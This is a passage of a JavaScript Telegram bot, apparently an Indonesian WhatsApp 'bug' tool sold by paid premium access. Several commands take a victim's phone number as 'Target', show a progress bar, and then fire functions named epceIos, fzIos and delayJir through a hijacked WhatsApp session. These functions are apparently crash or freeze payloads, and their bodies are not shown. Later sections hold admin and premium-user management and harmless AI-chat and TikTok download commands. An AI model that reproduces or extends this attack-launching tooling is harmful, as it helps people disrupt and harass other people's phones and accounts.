    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.invis, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.invis,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await delayJir(sock, target);
     await new Promise((r) => setTimeout(r, 100));
   }
});

// ========== COMMAND SPECS ==========
bot.onText(/^\/spetra (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.ios, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.ios, {
      caption: "Example: /spetra 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.ios, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.ios,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await epceIos(sock, target);
   }
});

// ========== COMMAND ELECTRON ==========
bot.onText(/^\/turathi (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.ios, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.ios, {
      caption: "Example: /turathi 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.ios, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.ios,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await epceIos(sock, target);
   }
});

// ========== COMMAND POLTERGEIST ==========
bot.onText(/^\/konosis (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.ios, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.ios, {
      caption: "Example: /konosis 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.ios, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.ios,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await fzIos(sock, target);
   }
});

// ========== COMMAND ADMIN ==========
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.",
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: `╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
      parse_mode: "Markdown"
    }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageMedia(
        {
          type: "photo",
          media: menuImages.owner,
          caption: `╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`
        },
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageMedia(
          {
            type: "photo",
            media: menuImages.owner,
            caption: `╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`
          },
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageMedia(
          {
            type: "photo",
            media: menuImages.owner,
            caption: `╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`
          },
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageMedia(
      {
        type: "photo",
        media: menuImages.owner,
        caption: `╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`
      },
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ You are not authorized to add premium users.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
          "YYYY-MM-DD HH:mm:ss"
        )}.`,
        parse_mode: "Markdown"
      }
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
          "YYYY-MM-DD HH:mm:ss"
        )}.`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ You are not authorized to view the premium list.",
        parse_mode: "Markdown"
      }
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "📌 No premium users found.",
        parse_mode: "Markdown"
      }
    );
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: message,
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match || !match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. Example: /addadmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} has been added as an admin.`,
        parse_mode: "Markdown"
      }
    );
  } else {
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `❌ User ${userId} is already an admin.`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ You are not authorized to remove premium users.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Please provide a user ID. Example: /delprem 6843967527",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. User ID must be a number.",
        parse_mode: "Markdown"
      }
    );
  }

  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `❌ User ${userId} is not in the premium list.`,
        parse_mode: "Markdown"
      }
    );
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: `✅ User ${userId} has been removed from the premium list.`,
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!match || !match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. Example: /deladmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} has been removed from admin.`,
        parse_mode: "Markdown"
      }
    );
  } else {
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `❌ User ${userId} is not an admin.`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/setcd (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }

  const duration = parseDuration(input);

  if (!duration) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Format salah!\nContoh: /setcd 10s | 5m | 1h",
        parse_mode: "Markdown"
      }
    );
  }

  cooldownDuration = duration;

  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: `✅ Cooldown diset ke ${input}`,
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^\/resetcd$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }
  cooldownDuration = 0;
  userCooldown.clear();
  

  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: "♻️ Cooldown berhasil direset!",
      parse_mode: "Markdown"
    }
  );
  } catch (error) {
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `error goblok!: ${error.message}`,
        parse_mode: "Markdown"
      }
    );
  }
});

//=======( TOOLS )=======\\
// ========== COMMAND GITA AI ==========
// ========== COMMAND GPTOSS 120B (METODE GET) ==========
bot.onText(/^\/gptoss (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userPrompt = match[1];

    await bot.sendMessage(chatId, "🧠 *GPT-OSS 120B mikir...*", { parse_mode: "Markdown" });

    try {
        // Gunakan metode GET dengan parameter query
        const apiUrl = 'https://api.siputzx.my.id/api/ai/gptoss120b';
        const response = await axios.get(apiUrl, {
            params: {
                prompt: userPrompt,
                system: "GW ECLIPSE AI GANTENG", // System prompt khas lu
                temperature: 0.7
            }
        });

        const data = response.data;
        
        // Parsing response sesuai struktur yang udah kita lihat
        if (data?.status && data?.data?.response) {
            const reply = data.data.response;
            await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" });
        } else {
            // Fallback kalo formatnya beda
            await bot.sendMessage(chatId, 
                `⚠️ Format response tidak dikenal:\n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``, 
                { parse_mode: "Markdown" }
            );
        }

    } catch (err) {
        console.error("GPTOSS ERROR:", err.message);
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command dengan custom system prompt
bot.onText(/^\/gptosscust (.+?) \| (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const systemPrompt = match[1]; // Prompt sebelum tanda "|"
    const userPrompt = match[2];   // Prompt setelah tanda "|"

    await bot.sendMessage(chatId, "🧠 *GPT-OSS 120B (custom mode)...*", { parse_mode: "Markdown" });

    try {
        const response = await axios.get('https://api.siputzx.my.id/api/ai/gptoss120b', {
            params: {
                prompt: userPrompt,
                system: systemPrompt,
                temperature: 0.7
            }
        });

        const data = response.data;
        
        if (data?.status && data?.data?.response) {
            await bot.sendMessage(chatId, data.data.response, { parse_mode: "Markdown" });
        } else {
            await bot.sendMessage(chatId, `⚠️ ${JSON.stringify(data)}`);
        }

    } catch (err) {
        console.error("GPTOSS CUST ERROR:", err.message);
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command help
bot.onText(/^\/gptoss(?:help)?$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        "*🧠 GPT-OSS 120B AI*\n\n" +
        "*Command:*\n" +
        "• `/gptoss <pertanyaan>` - Mode default\n" +
        "• `/gptosscust <system> | <pertanyaan>` - Mode custom system\n\n" +
        "*Contoh:*\n" +
        "`/gptoss Halo siapa kamu?`\n" +
        "`/gptosscust Kamu asisten galak | Halo`\n\n" +
        "_Temperature: 0.7_",
        { parse_mode: "Markdown" }
    );
});

// ========== COMMAND GITA AI (METODE GET) ==========
bot.onText(/^\/gita (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userQuestion = match[1]; // Ambil pertanyaan user

    await bot.sendMessage(chatId, "📖 *Gita AI sedang merenung...*", { parse_mode: "Markdown" });

    try {
        // Gunakan metode GET dengan parameter query 'q'
        const apiUrl = 'https://api.siputzx.my.id/api/ai/gita';
        const response = await axios.get(apiUrl, {
            params: {
                q: userQuestion // Parameter yang benar adalah 'q'
            }
        });

        const result = response.data;
        
        // Parsing response sesuai struktur yang udah kita lihat
        if (result?.status && result?.data) {
            const reply = result.data; // Jawaban ada di field 'data'
            await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" });
        } else {
            // Fallback kalo formatnya beda
            await bot.sendMessage(chatId, 
                `⚠️ Format response tidak dikenal:\n\`\`\`${JSON.stringify(result, null, 2)}\`\`\``, 
                { parse_mode: "Markdown" }
            );
        }

    } catch (err) {
        console.error("GITA AI ERROR:", err.message);
        
        let errorMsg = "❌ Error: " + err.message;
        if (err.response?.data) {
            errorMsg += `\nDetail: ${JSON.stringify(err.response.data)}`;
        }
        
        bot.sendMessage(chatId, errorMsg);
    }
});

// Command help untuk Gita
bot.onText(/^\/gita(?:help)?$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        "*📖 Gita AI - Kebijaksanaan dari Bhagavad Gita*\n\n" +
        "Tanya apapun tentang kehidupan, karma, dharma, dan filsafat Hindu.\n\n" +
        "*Cara Pakai:*\n" +
        "• `/gita Apa itu karma?`\n" +
        "• `/gita Siapa Krishna?`\n" +
        "• `/gita Makna hidup`\n\n" +
        "_Dapatkan jawaban bijak dari kitab suci Bhagavad Gita._",
        { parse_mode: "Markdown" }
    );
});

bot.onText(/^\/tiktokdl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  await bot.sendMessage(chatId, "📥 Tunggu bentar bre, lagi download video TikTok-nya...");

  try {
    const api = `https://api.nekolabs.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data dari API NekoLabs bre.");
    }

    const result = data.result;

    const caption =
      `*TikTok Downloader*\n\n` +
      `*Author: ${result.author.name}* (${result.author.username})\n` +
      `*Music: ${result.music_info.title}* - ${result.music_info.author}\n` +
      `Like: ${result.stats.like}  💬 ${result.stats.comment}  🔁 ${result.stats.share}\n` +
      `Date: ${result.create_at}`;

    await bot.sendVideo(chatId, result.videoUrl, {
      caption,
      parse_mode: "Markdown",
    });
    
    await bot.sendAudio(chatId, result.musicUrl, {
      filename: `${result.music_info.title}.mp3`,
      caption: `🎵 ${result.music_info.title} - ${result.music_info.author}`,
      parse_mode: "Markdown",
    });

  } catch (err) {
